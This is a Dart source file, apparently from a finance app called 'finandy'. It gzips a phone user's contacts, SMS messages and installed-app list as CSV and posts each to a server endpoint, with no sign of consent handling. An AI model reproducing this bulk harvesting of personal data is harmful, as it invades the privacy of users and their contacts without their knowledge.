import 'dart:convert';
import 'dart:io';

import 'package:csv/csv.dart';
import 'package:finandy/modals/server.dart';
import 'package:http/http.dart' as http;

Server server = Server();

contactsSender(contactsData) async{
    final csvData = const ListToCsvConverter().convert(contactsData);
    final csvDataBytes = utf8.encode(csvData);
    final zip = gzip.encode(csvDataBytes);
     final res = await http.post(server.getUri('contact'), body: {"data": zip});

     if(res.statusCode == 200){
       print("SuccessFull");
     }else {
       print("Error, ${res.statusCode}");
     }
}

smsSender(smsData) async {
    final csvData = const ListToCsvConverter().convert(smsData);
    final csvDataBytes = utf8.encode(csvData);
    final zip = gzip.encode(csvDataBytes);
     final res = await http.post(server.getUri('sms'), body: {"data": zip});

     if(res.statusCode == 200){
       print("SuccessFull");
     }else {
       print("Error, ${res.statusCode}");
     }
}

appInfoSender(appsInfo) async {
  final csvData = const ListToCsvConverter().convert(appsInfo);
    final csvDataBytes = utf8.encode(csvData);
    final zip = gzip.encode(csvDataBytes);
     final res = await http.post(server.getUri('appsInfo'), body: {"data": zip});

     if(res.statusCode == 200){
       print("SuccessFull");
     }else {
       print("Error, ${res.statusCode}");
     }
}